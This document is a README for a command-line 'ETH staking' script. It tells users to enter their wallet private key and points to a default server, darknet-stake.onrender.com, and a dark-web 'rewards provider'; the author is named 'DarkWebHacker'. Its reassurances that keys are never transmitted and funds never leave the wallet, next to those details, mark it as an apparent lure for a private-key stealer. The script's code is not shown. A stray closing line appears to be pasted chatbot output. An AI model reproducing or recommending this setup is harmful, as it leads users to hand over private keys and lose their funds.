# 🧠 Stake_and_Earn_ETH — Ethereum Staking Script

This is a secure and interactive command-line script (`stake.js`) that allows users to stake ETH on the **Ethereum mainnet** using the [`ethers.js`](https://docs.ethers.org/v6/) library. It supports:

- ✅ Full validator mode (≥ 32 ETH)
- ✅ Pool staking for smaller balances
- 🔐 Local encryption of private keys using a dynamic encryption key per session
- 🔚 Session ending after process is done
- 🧠 Non-custodial staking — your funds stay in your wallet

> The higher your stake, the higher your potential rewards.

---

## 🌐 Server Gist

Find the server instance here...
https://gist.github.com/PyScript-dark/445fa264f96c6c863432e4cfc77bb749

> Note that the rewards provider url is not displayed since it is on the dark web.

## ⚙️ Prerequisites

You'll need `Node.js` and `npm` installed.

### Check installation:

```bash
node -v
npm -v
```

### If not installed:

- **Windows/macOS:**  
  👉 [Download from nodejs.org](https://nodejs.org)

- **Linux (Debian/Ubuntu):**

```bash
sudo apt update
sudo apt install nodejs npm
```

---

## 🛠 Setup Instructions

### 1. Initialize your project

```bash
npm init -y
```

### 2. Install Dependencies

```bash
npm install ethers readline node-fetch axios uuid
```

> `crypto` and `readline` are part of Node.js core, but `node-fetch` is needed for network requests in Node <18.

---

## 🚀 Running the Script

```bash
node stake.js
```

You'll be prompted to enter:

- Your ETH **wallet address**
- Your **private key** (used only for signing - never stored or revealed)
- **Staking period** (in days)
- **User ID** for tracking rewards

---

## 🔐 Security & Functionality Notes

- Your ETH coins are never transferred out of your wallet.
- Your private key is encrypted using a dynamic encryption key different for each session.
- Session is ended after each staking process is complete.
- Private keys are never logged or transferred to external servers, meaning no admin can have access to it.
- A balance check is performed to determine whether you can act as a full validator (32 ETH) or join a staking pool.
- The script connects to Ethereum mainnet using Infura RPC. You can replace the default URL with your own.

### Change RPC URL (optional):
Inside `stake.js`, replace:
```js
const rpcUrl = 'https://mainnet.infura.io/v3/YOUR_INFURA_KEY';
```

---

## ❗ Important

- **Non-custodial staking:** ETH stays in your wallet.
- **Rewards vary** based on stake size and network conditions.
- **Do not modify** the script unless you're familiar with encryption and Ethereum logic.
- **Use responsibly:** Know where your requests are going. Default server URL:
  ```
  https://darknet-stake.onrender.com
  ```

---

## 🧯 Troubleshooting

- If `node` or `npm` isn't recognized, ensure it's added to your system’s PATH.
- Restart your terminal after installation if needed.
- If the script fails during a request, double-check your ETH address, private key, and internet connection.

---

## 🪪 License

This project is **free to use**, but modifications to its logic should be made carefully and at your own risk.

---

## 👤 Author

**DarkWebHacker**  
🔗 https://keybase.io/darkwebhacker

Let me know if you'd like a second version for `testnet` usage, or if you'd like to include a `.env` setup or Docker instructions!
